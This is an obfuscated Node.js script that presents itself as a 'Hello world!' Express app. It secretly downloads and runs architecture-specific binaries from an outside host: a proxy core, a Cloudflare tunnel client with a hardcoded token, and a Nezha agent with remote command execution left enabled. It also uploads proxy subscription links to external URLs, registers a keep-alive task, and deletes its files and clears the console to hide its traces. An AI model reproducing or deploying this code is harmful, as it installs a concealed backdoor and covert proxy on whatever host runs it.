const _0xa5364e=_0x527f;(function(_0x26ad4e,_0x4fcae0){const _0x3881e7=_0x527f,_0x5ba8af=_0x26ad4e();while(!![]){try{const _0x26ee44=-parseInt(_0x3881e7(0x142))/0x1+-parseInt(_0x3881e7(0x103))/0x2+parseInt(_0x3881e7(0x12f))/0x3+parseInt(_0x3881e7(0x134))/0x4+-parseInt(_0x3881e7(0xba))/0x5*(-parseInt(_0x3881e7(0xfc))/0x6)+-parseInt(_0x3881e7(0xb9))/0x7+-parseInt(_0x3881e7(0x15a))/0x8*(-parseInt(_0x3881e7(0xe9))/0x9);if(_0x26ee44===_0x4fcae0)break;else _0x5ba8af['push'](_0x5ba8af['shift']());}catch(_0x141d03){_0x5ba8af['push'](_0x5ba8af['shift']());}}}(_0x5e75,0x654e0));const express=require(_0xa5364e(0xd3)),app=express(),axios=require(_0xa5364e(0x11c)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require('child_process')[_0xa5364e(0xea)]),{execSync}=require(_0xa5364e(0x105)),UPLOAD_URL=process[_0xa5364e(0xc6)]['UPLOAD_URL']||'',PROJECT_URL=process[_0xa5364e(0xc6)][_0xa5364e(0xeb)]||'',AUTO_ACCESS=process['env'][_0xa5364e(0xe3)]||![],FILE_PATH=process[_0xa5364e(0xc6)][_0xa5364e(0x137)]||_0xa5364e(0xfb),SUB_PATH=process[_0xa5364e(0xc6)][_0xa5364e(0x146)]||_0xa5364e(0xda),PORT=process[_0xa5364e(0xc6)]['SERVER_PORT']||process['env']['PORT']||0xbb8,UUID=process[_0xa5364e(0xc6)][_0xa5364e(0x125)]||'9afd1229-b893-40c1-84dd-51e7ce204913',NEZHA_SERVER=process[_0xa5364e(0xc6)][_0xa5364e(0x104)]||'',NEZHA_PORT=process['env'][_0xa5364e(0x127)]||'',NEZHA_KEY=process['env'][_0xa5364e(0xe5)]||'',ARGO_DOMAIN=process[_0xa5364e(0xc6)]['ARGO_DOMAIN']||_0xa5364e(0xb8),ARGO_AUTH=process['env'][_0xa5364e(0x14c)]||'eyJhIjoiYTk0NTU1ZmE5YmEyMzgxMWY5ZDcwMzI2NmI1NWRhODgiLCJ0IjoiZDZhYmE5M2EtMmRiOS00OGU0LWIxN2MtM2ZmNzQ5YTkyMTAwIiwicyI6IlpEWTVOemMzTXpndE1tRmxaaTAwTkdFM0xXRTBaV1F0T1RabE1USmtPVFUxTjJaaCJ9',ARGO_PORT=process['env']['ARGO_PORT']||0x2382,CFIP=process['env'][_0xa5364e(0x107)]||_0xa5364e(0xdc),CFPORT=process[_0xa5364e(0xc6)][_0xa5364e(0xe7)]||0x1bb,NAME=process[_0xa5364e(0xc6)]['NAME']||_0xa5364e(0xbe);!fs[_0xa5364e(0xb0)](FILE_PATH)?(fs[_0xa5364e(0x115)](FILE_PATH),console['log'](FILE_PATH+_0xa5364e(0x108))):console['log'](FILE_PATH+_0xa5364e(0x123));function generateRandomName(){const _0x29e78e=_0xa5364e,_0x52b6a6=_0x29e78e(0xf8);let _0x552e24='';for(let _0xf0bf00=0x0;_0xf0bf00<0x6;_0xf0bf00++){_0x552e24+=_0x52b6a6['charAt'](Math[_0x29e78e(0x13c)](Math[_0x29e78e(0xc3)]()*_0x52b6a6[_0x29e78e(0xf9)]));}return _0x552e24;}function _0x5e75(){const _0x90e2cb=['http','/vless-argo','SUB_PATH','block','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','automatic\x20access\x20task\x20added\x20successfully','filter','direct','ARGO_AUTH','join','sub.txt','/sub.txt\x20saved\x20successfully','https://arm64.ssss.nyc.mn/web','\x0avless://','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Error\x20reading\x20boot.log:','error','split','ARGO_DOMAIN:','get','\x20is\x20running','createWriteStream','2011560blgjbQ','/dev/null','/api/add-subscriptions','Empowerment\x20success\x20for\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','aarch64','unlinkSync','post','freedom','amd','clear','existsSync','?security=tls&sni=','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','http\x20server\x20is\x20running\x20on\x20port:','Skipping\x20adding\x20automatic\x20access\x20task','list.txt','includes','Unhandled\x20error\x20in\x20startserver:','ds.zento.dpdns.org此链接将在新标签面中打开','3242064GkdYHS','5PjylBx','vless','unshift','/trojan-argo','jjdd','config.yaml','arch','ArgoDomain:','.exe\x20>\x20nul\x202>&1','random','pkill\x20-f\x20\x22[','2053','env','?encryption=none&security=tls&sni=','/vmess-argo','https://amd64.ssss.nyc.mn/agent','finish','&path=%2Fvless-argo%3Fed%3D2560#','base64','win32','https://arm64.ssss.nyc.mn/v1','log','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','listen','writeFileSync','express','2083','true','arm','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','443','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','dingyue','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','cdns.doon.eu.org','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','test','/api/delete-nodes','response','tcp','Error\x20in\x20startserver:','AUTO_ACCESS','https://oooo.serv00.net/add-url','NEZHA_KEY','tunnel.json','CFPORT','config.json','9vGPeZy','exec','PROJECT_URL','npm\x20running\x20error:\x20','\x20-p\x20','8443','&path=%2Ftrojan-argo%3Fed%3D2560#','readdirSync','App\x20is\x20running','quic','/api/add-nodes','https://amd64.ssss.nyc.mn/bot','readFileSync','text/plain;\x20charset=utf-8','Hello\x20world!','abcdefghijklmnopqrstuvwxyz','length','stream','./tmp','3454674xYiLvM','arm64','Content-Type','blackhole','tunnel.yml','web\x20running\x20error:\x20','firefox','299724adwgTC','NEZHA_SERVER','child_process','vmess','CFIP','\x20is\x20created','all','then','\x20-s\x20','charAt','close','message','none','basename','data','forEach','from','NEZHA\x20variable\x20is\x20empty,skip\x20running','mkdirSync','Download\x20','fileName','match','send','status','has','axios','Error\x20executing\x20command:\x20','Empowerment\x20failed\x20for\x20','/tunnel.yml\x20run','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','fileUrl','utf-8','\x20already\x20exists','xtls-rprx-vision','UUID','catch','NEZHA_PORT','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x20-c\x20\x22','\x0a\x20\x20credentials-file:\x20','php\x20running\x20error:\x20','application/json','&fp=firefox&type=ws&host=','967083SmLweZ','\x0a\x20\x20tunnel:\x20','isFile','\x20>/dev/null\x202>&1\x20&','tls','2719624dHKzXW','\x20successfully','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','FILE_PATH','stringify','127.0.0.1','platform','push','floor','toString','map','2087','nohup\x20','taskkill\x20/f\x20/im\x20','801533eOaXZy','boot.log'];_0x5e75=function(){return _0x90e2cb;};return _0x5e75();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xa5364e(0x14d)](FILE_PATH,npmName),phpPath=path[_0xa5364e(0x14d)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0xa5364e(0x14d)](FILE_PATH,botName),subPath=path[_0xa5364e(0x14d)](FILE_PATH,_0xa5364e(0x14e)),listPath=path[_0xa5364e(0x14d)](FILE_PATH,_0xa5364e(0xb5)),bootLogPath=path[_0xa5364e(0x14d)](FILE_PATH,_0xa5364e(0x143)),configPath=path['join'](FILE_PATH,_0xa5364e(0xe8));function deleteNodes(){const _0xa136e1=_0xa5364e;try{if(!UPLOAD_URL)return;if(!fs[_0xa136e1(0xb0)](subPath))return;let _0x38f426;try{_0x38f426=fs['readFileSync'](subPath,_0xa136e1(0x122));}catch{return null;}const _0x4137bc=Buffer['from'](_0x38f426,_0xa136e1(0xcc))[_0xa136e1(0x13d)](_0xa136e1(0x122)),_0x3e5dd5=_0x4137bc['split']('\x0a')[_0xa136e1(0x14a)](_0x3fd5f6=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xa136e1(0xde)](_0x3fd5f6));if(_0x3e5dd5['length']===0x0)return;return axios[_0xa136e1(0x161)](UPLOAD_URL+_0xa136e1(0xdf),JSON[_0xa136e1(0x138)]({'nodes':_0x3e5dd5}),{'headers':{'Content-Type':_0xa136e1(0x12d)}})[_0xa136e1(0x126)](_0x351465=>{return null;}),null;}catch(_0x39190f){return null;}}function cleanupOldFiles(){const _0x235ec1=_0xa5364e;try{const _0xae6901=fs[_0x235ec1(0xf0)](FILE_PATH);_0xae6901[_0x235ec1(0x112)](_0x994bef=>{const _0x5da0ae=_0x235ec1,_0x110c43=path[_0x5da0ae(0x14d)](FILE_PATH,_0x994bef);try{const _0x3075c6=fs['statSync'](_0x110c43);_0x3075c6[_0x5da0ae(0x131)]()&&fs[_0x5da0ae(0x160)](_0x110c43);}catch(_0x481de2){}});}catch(_0x15c13c){}}app[_0xa5364e(0x157)]('/',function(_0x166d8c,_0x52ae04){const _0x5a53bc=_0xa5364e;_0x52ae04[_0x5a53bc(0x119)](_0x5a53bc(0xf7));});async function generateConfig(){const _0x570480=_0xa5364e,_0x59e4cb={'log':{'access':'/dev/null','error':_0x570480(0x15b),'loglevel':_0x570480(0x10f)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x570480(0x124)}],'decryption':_0x570480(0x10f),'fallbacks':[{'dest':0xbb9},{'path':_0x570480(0x145),'dest':0xbba},{'path':_0x570480(0xc8),'dest':0xbbb},{'path':_0x570480(0xbd),'dest':0xbbc}]},'streamSettings':{'network':_0x570480(0xe1)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x570480(0x10f)},'streamSettings':{'network':_0x570480(0xe1),'security':_0x570480(0x10f)}},{'port':0xbba,'listen':_0x570480(0x139),'protocol':_0x570480(0xbb),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x570480(0x10f)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x570480(0x145)}},'sniffing':{'enabled':!![],'destOverride':[_0x570480(0x144),_0x570480(0x133),_0x570480(0xf2)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x570480(0x106),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x570480(0xc8)}},'sniffing':{'enabled':!![],'destOverride':[_0x570480(0x144),_0x570480(0x133),_0x570480(0xf2)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x570480(0x139),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x570480(0x10f),'wsSettings':{'path':_0x570480(0xbd)}},'sniffing':{'enabled':!![],'destOverride':[_0x570480(0x144),_0x570480(0x133),_0x570480(0xf2)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x570480(0xad),'tag':_0x570480(0x14b)},{'protocol':_0x570480(0xff),'tag':_0x570480(0x147)}]};fs[_0x570480(0xd2)](path[_0x570480(0x14d)](FILE_PATH,_0x570480(0xe8)),JSON['stringify'](_0x59e4cb,null,0x2));}function getSystemArchitecture(){const _0x1e2f3e=_0xa5364e,_0x502d71=os[_0x1e2f3e(0xc0)]();return _0x502d71===_0x1e2f3e(0xd6)||_0x502d71===_0x1e2f3e(0xfd)||_0x502d71===_0x1e2f3e(0x15f)?'arm':_0x1e2f3e(0xae);}function downloadFile(_0x4ead42,_0x57ebaf,_0x4ad57c){const _0x11100d=_0xa5364e,_0x212a1b=_0x4ead42;!fs[_0x11100d(0xb0)](FILE_PATH)&&fs[_0x11100d(0x115)](FILE_PATH,{'recursive':!![]});const _0x2413cc=fs[_0x11100d(0x159)](_0x212a1b);axios({'method':_0x11100d(0x157),'url':_0x57ebaf,'responseType':_0x11100d(0xfa)})[_0x11100d(0x10a)](_0x2c3fa3=>{const _0x116196=_0x11100d;_0x2c3fa3[_0x116196(0x111)]['pipe'](_0x2413cc),_0x2413cc['on'](_0x116196(0xca),()=>{const _0x4493ef=_0x116196;_0x2413cc[_0x4493ef(0x10d)](),console[_0x4493ef(0xcf)]('Download\x20'+path[_0x4493ef(0x110)](_0x212a1b)+_0x4493ef(0x135)),_0x4ad57c(null,_0x212a1b);}),_0x2413cc['on'](_0x116196(0x154),_0x11135d=>{const _0x156123=_0x116196;fs['unlink'](_0x212a1b,()=>{});const _0x4f5646=_0x156123(0x116)+path[_0x156123(0x110)](_0x212a1b)+'\x20failed:\x20'+_0x11135d['message'];console['error'](_0x4f5646),_0x4ad57c(_0x4f5646);});})[_0x11100d(0x126)](_0x34935d=>{const _0x194f0e=_0x11100d,_0x3154a5=_0x194f0e(0x116)+path[_0x194f0e(0x110)](_0x212a1b)+'\x20failed:\x20'+_0x34935d[_0x194f0e(0x10e)];console[_0x194f0e(0x154)](_0x3154a5),_0x4ad57c(_0x3154a5);});}async function downloadFilesAndRun(){const _0xa64ad8=_0xa5364e,_0x383e90=getSystemArchitecture(),_0x404268=getFilesForArchitecture(_0x383e90);if(_0x404268[_0xa64ad8(0xf9)]===0x0){console[_0xa64ad8(0xcf)](_0xa64ad8(0x148));return;}const _0x1d4745=_0x404268[_0xa64ad8(0x13e)](_0x9f89fa=>{return new Promise((_0x2a27a6,_0x289494)=>{const _0x30527c=_0x527f;downloadFile(_0x9f89fa[_0x30527c(0x117)],_0x9f89fa[_0x30527c(0x121)],(_0x2dd5f8,_0xfcf828)=>{_0x2dd5f8?_0x289494(_0x2dd5f8):_0x2a27a6(_0xfcf828);});});});try{await Promise[_0xa64ad8(0x109)](_0x1d4745);}catch(_0x3f86a6){console[_0xa64ad8(0x154)]('Error\x20downloading\x20files:',_0x3f86a6);return;}function _0x597f6f(_0x653fbe){const _0x3fc92f=_0xa64ad8,_0x2b2cdf=0x1fd;_0x653fbe[_0x3fc92f(0x112)](_0x2451f1=>{const _0x4e2e1f=_0x3fc92f;fs[_0x4e2e1f(0xb0)](_0x2451f1)&&fs['chmod'](_0x2451f1,_0x2b2cdf,_0x14b9ad=>{const _0x23de57=_0x4e2e1f;_0x14b9ad?console[_0x23de57(0x154)](_0x23de57(0x11e)+_0x2451f1+':\x20'+_0x14b9ad):console[_0x23de57(0xcf)](_0x23de57(0x15d)+_0x2451f1+':\x20'+_0x2b2cdf[_0x23de57(0x13d)](0x8));});});}const _0x49e477=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x597f6f(_0x49e477);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1982b3=NEZHA_SERVER[_0xa64ad8(0xb6)](':')?NEZHA_SERVER[_0xa64ad8(0x155)](':')['pop']():'',_0x5c8820=new Set([_0xa64ad8(0xd8),_0xa64ad8(0xee),'2096',_0xa64ad8(0x13f),_0xa64ad8(0xd4),'2053']),_0x3fe5fe=_0x5c8820[_0xa64ad8(0x11b)](_0x1982b3)?_0xa64ad8(0xd5):'false',_0x251b6e='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0xa64ad8(0x129)+_0x3fe5fe+_0xa64ad8(0x136)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0xa64ad8(0xbf)),_0x251b6e);const _0x5179cf=_0xa64ad8(0x140)+phpPath+_0xa64ad8(0x12a)+FILE_PATH+_0xa64ad8(0xdd);try{await exec(_0x5179cf),console[_0xa64ad8(0xcf)](phpName+_0xa64ad8(0x158)),await new Promise(_0x5f181c=>setTimeout(_0x5f181c,0x3e8));}catch(_0x4aea76){console[_0xa64ad8(0x154)](_0xa64ad8(0x12c)+_0x4aea76);}}else{let _0x499939='';const _0x269bc0=[_0xa64ad8(0xd8),_0xa64ad8(0xee),'2096',_0xa64ad8(0x13f),_0xa64ad8(0xd4),_0xa64ad8(0xc5)];_0x269bc0[_0xa64ad8(0xb6)](NEZHA_PORT)&&(_0x499939='--tls');const _0x5b0d2e=_0xa64ad8(0x140)+npmPath+_0xa64ad8(0x10b)+NEZHA_SERVER+':'+NEZHA_PORT+_0xa64ad8(0xed)+NEZHA_KEY+'\x20'+_0x499939+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5b0d2e),console[_0xa64ad8(0xcf)](npmName+_0xa64ad8(0x158)),await new Promise(_0x4b155d=>setTimeout(_0x4b155d,0x3e8));}catch(_0x575f28){console[_0xa64ad8(0x154)](_0xa64ad8(0xec)+_0x575f28);}}}else console[_0xa64ad8(0xcf)](_0xa64ad8(0x114));const _0x4b140f='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4b140f),console['log'](webName+_0xa64ad8(0x158)),await new Promise(_0x27bedb=>setTimeout(_0x27bedb,0x3e8));}catch(_0x36cd17){console['error'](_0xa64ad8(0x101)+_0x36cd17);}if(fs[_0xa64ad8(0xb0)](botPath)){let _0x50ee99;if(ARGO_AUTH[_0xa64ad8(0x118)](/^[A-Z0-9a-z=]{120,250}$/))_0x50ee99=_0xa64ad8(0xd7)+ARGO_AUTH;else ARGO_AUTH[_0xa64ad8(0x118)](/TunnelSecret/)?_0x50ee99=_0xa64ad8(0x15e)+FILE_PATH+_0xa64ad8(0x11f):_0x50ee99=_0xa64ad8(0xd0)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x50ee99+_0xa64ad8(0x132)),console[_0xa64ad8(0xcf)](botName+'\x20is\x20running'),await new Promise(_0x1a3603=>setTimeout(_0x1a3603,0x7d0));}catch(_0x45f550){console[_0xa64ad8(0x154)](_0xa64ad8(0x11d)+_0x45f550);}}await new Promise(_0x2b7073=>setTimeout(_0x2b7073,0x1388));}function getFilesForArchitecture(_0x6199d5){const _0x3d583c=_0xa5364e;let _0x2581ab;_0x6199d5===_0x3d583c(0xd6)?_0x2581ab=[{'fileName':webPath,'fileUrl':_0x3d583c(0x150)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x2581ab=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3d583c(0xf4)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3ed58b=_0x6199d5===_0x3d583c(0xd6)?'https://arm64.ssss.nyc.mn/agent':_0x3d583c(0xc9);_0x2581ab[_0x3d583c(0xbc)]({'fileName':npmPath,'fileUrl':_0x3ed58b});}else{const _0x16de56=_0x6199d5===_0x3d583c(0xd6)?_0x3d583c(0xce):'https://amd64.ssss.nyc.mn/v1';_0x2581ab['unshift']({'fileName':phpPath,'fileUrl':_0x16de56});}}return _0x2581ab;}function argoType(){const _0x4f712e=_0xa5364e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4f712e(0xcf)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x4f712e(0xb6)]('TunnelSecret')){fs['writeFileSync'](path['join'](FILE_PATH,_0x4f712e(0xe6)),ARGO_AUTH);const _0x267db0=_0x4f712e(0x130)+ARGO_AUTH[_0x4f712e(0x155)]('\x22')[0xb]+_0x4f712e(0x12b)+path[_0x4f712e(0x14d)](FILE_PATH,_0x4f712e(0xe6))+_0x4f712e(0xb2)+ARGO_DOMAIN+_0x4f712e(0xd9)+ARGO_PORT+_0x4f712e(0x120);fs[_0x4f712e(0xd2)](path[_0x4f712e(0x14d)](FILE_PATH,_0x4f712e(0x100)),_0x267db0);}else console[_0x4f712e(0xcf)](_0x4f712e(0x128));}argoType();function _0x527f(_0x50cc27,_0x13c575){const _0x5e7591=_0x5e75();return _0x527f=function(_0x527ff8,_0x38e673){_0x527ff8=_0x527ff8-0xad;let _0x541db9=_0x5e7591[_0x527ff8];return _0x541db9;},_0x527f(_0x50cc27,_0x13c575);}async function extractDomains(){const _0xbec9d0=_0xa5364e;let _0x22e8fe;if(ARGO_AUTH&&ARGO_DOMAIN)_0x22e8fe=ARGO_DOMAIN,console[_0xbec9d0(0xcf)](_0xbec9d0(0x156),_0x22e8fe),await _0x208416(_0x22e8fe);else try{const _0x35d1d1=fs[_0xbec9d0(0xf5)](path['join'](FILE_PATH,_0xbec9d0(0x143)),'utf-8'),_0x68dabe=_0x35d1d1[_0xbec9d0(0x155)]('\x0a'),_0x1ffee7=[];_0x68dabe[_0xbec9d0(0x112)](_0x5139b2=>{const _0x2c8f60=_0xbec9d0,_0x129c96=_0x5139b2[_0x2c8f60(0x118)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x129c96){const _0x9038d4=_0x129c96[0x1];_0x1ffee7[_0x2c8f60(0x13b)](_0x9038d4);}});if(_0x1ffee7[_0xbec9d0(0xf9)]>0x0)_0x22e8fe=_0x1ffee7[0x0],console['log'](_0xbec9d0(0xc1),_0x22e8fe),await _0x208416(_0x22e8fe);else{console[_0xbec9d0(0xcf)](_0xbec9d0(0xdb)),fs['unlinkSync'](path['join'](FILE_PATH,_0xbec9d0(0x143)));async function _0x4b97e4(){const _0x38196c=_0xbec9d0;try{process[_0x38196c(0x13a)]==='win32'?await exec(_0x38196c(0x141)+botName+_0x38196c(0xc2)):await exec(_0x38196c(0xc4)+botName[_0x38196c(0x10c)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x41086a){}}_0x4b97e4(),await new Promise(_0x4acc8f=>setTimeout(_0x4acc8f,0xbb8));const _0x309c41='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xbec9d0(0x152)+ARGO_PORT;try{await exec(_0xbec9d0(0x140)+botPath+'\x20'+_0x309c41+_0xbec9d0(0x132)),console[_0xbec9d0(0xcf)](botName+'\x20is\x20running'),await new Promise(_0xb8008b=>setTimeout(_0xb8008b,0xbb8)),await extractDomains();}catch(_0x5dc755){console['error'](_0xbec9d0(0x11d)+_0x5dc755);}}}catch(_0x5a3c90){console[_0xbec9d0(0x154)](_0xbec9d0(0x153),_0x5a3c90);}async function _0x208416(_0x11aebd){const _0x415143=_0xbec9d0,_0x2a6c88=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x415143(0x122)}),_0x29a17d=_0x2a6c88['trim'](),_0x557a6f=NAME?NAME+'-'+_0x29a17d:_0x29a17d;return new Promise(_0x3b4626=>{setTimeout(()=>{const _0x420417=_0x527f,_0x5cd97c={'v':'2','ps':''+_0x557a6f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x11aebd,'path':'/vmess-argo?ed=2560','tls':_0x420417(0x133),'sni':_0x11aebd,'alpn':'','fp':_0x420417(0x102)},_0x32f741=_0x420417(0x151)+UUID+'@'+CFIP+':'+CFPORT+_0x420417(0xc7)+_0x11aebd+_0x420417(0x12e)+_0x11aebd+_0x420417(0xcb)+_0x557a6f+'\x0a\x20\x20\x0avmess://'+Buffer[_0x420417(0x113)](JSON[_0x420417(0x138)](_0x5cd97c))[_0x420417(0x13d)](_0x420417(0xcc))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x420417(0xb1)+_0x11aebd+'&fp=firefox&type=ws&host='+_0x11aebd+_0x420417(0xef)+_0x557a6f+'\x0a\x20\x20\x20\x20';console[_0x420417(0xcf)](Buffer[_0x420417(0x113)](_0x32f741)[_0x420417(0x13d)](_0x420417(0xcc))),fs[_0x420417(0xd2)](subPath,Buffer[_0x420417(0x113)](_0x32f741)[_0x420417(0x13d)](_0x420417(0xcc))),console['log'](FILE_PATH+_0x420417(0x14f)),uploadNodes(),app[_0x420417(0x157)]('/'+SUB_PATH,(_0x110876,_0xa99156)=>{const _0x26b8a3=_0x420417,_0x39e475=Buffer[_0x26b8a3(0x113)](_0x32f741)[_0x26b8a3(0x13d)](_0x26b8a3(0xcc));_0xa99156['set'](_0x26b8a3(0xfe),_0x26b8a3(0xf6)),_0xa99156[_0x26b8a3(0x119)](_0x39e475);}),_0x3b4626(_0x32f741);},0x7d0);});}}async function uploadNodes(){const _0x369e61=_0xa5364e;if(UPLOAD_URL&&PROJECT_URL){const _0x413a7c=PROJECT_URL+'/'+SUB_PATH,_0xe188c7={'subscription':[_0x413a7c]};try{const _0x7c93af=await axios[_0x369e61(0x161)](UPLOAD_URL+_0x369e61(0x15c),_0xe188c7,{'headers':{'Content-Type':_0x369e61(0x12d)}});return _0x7c93af&&_0x7c93af[_0x369e61(0x11a)]===0xc8?(console[_0x369e61(0xcf)]('Subscription\x20uploaded\x20successfully'),_0x7c93af):null;}catch(_0x4a20e9){if(_0x4a20e9[_0x369e61(0xe0)]){if(_0x4a20e9['response'][_0x369e61(0x11a)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x369e61(0xb0)](listPath))return;const _0x588b0a=fs['readFileSync'](listPath,_0x369e61(0x122)),_0x3cbfa9=_0x588b0a['split']('\x0a')['filter'](_0x119556=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x369e61(0xde)](_0x119556));if(_0x3cbfa9[_0x369e61(0xf9)]===0x0)return;const _0x22f703=JSON[_0x369e61(0x138)]({'nodes':_0x3cbfa9});try{const _0x1c3edc=await axios['post'](UPLOAD_URL+_0x369e61(0xf3),_0x22f703,{'headers':{'Content-Type':_0x369e61(0x12d)}});return _0x1c3edc&&_0x1c3edc[_0x369e61(0x11a)]===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x1c3edc):null;}catch(_0x4d823f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4983a0=_0x527f,_0x1dd66b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1dd66b[_0x4983a0(0x13b)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1dd66b['push'](phpPath);process['platform']===_0x4983a0(0xcd)?exec('del\x20/f\x20/q\x20'+_0x1dd66b[_0x4983a0(0x14d)]('\x20')+'\x20>\x20nul\x202>&1',_0x3752d6=>{const _0x20aa15=_0x4983a0;console['clear'](),console[_0x20aa15(0xcf)](_0x20aa15(0xf1)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x1dd66b['join']('\x20')+'\x20>/dev/null\x202>&1',_0x4f9b06=>{const _0x31ac59=_0x4983a0;console[_0x31ac59(0xaf)](),console[_0x31ac59(0xcf)](_0x31ac59(0xf1)),console[_0x31ac59(0xcf)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4c1e08=_0xa5364e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4c1e08(0xcf)](_0x4c1e08(0xb4));return;}try{const _0x3bc4ad=await axios[_0x4c1e08(0x161)](_0x4c1e08(0xe4),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x4c1e08(0xcf)](_0x4c1e08(0x149)),_0x3bc4ad;}catch(_0x455dde){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x455dde[_0x4c1e08(0x10e)]),null;}}async function startserver(){const _0x503078=_0xa5364e;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xf81870){console['error'](_0x503078(0xe2),_0xf81870);}}startserver()[_0xa5364e(0x126)](_0x2f5b9f=>{const _0x438b6e=_0xa5364e;console['error'](_0x438b6e(0xb7),_0x2f5b9f);}),app[_0xa5364e(0xd1)](PORT,()=>console[_0xa5364e(0xcf)](_0xa5364e(0xb3)+PORT+'!'));
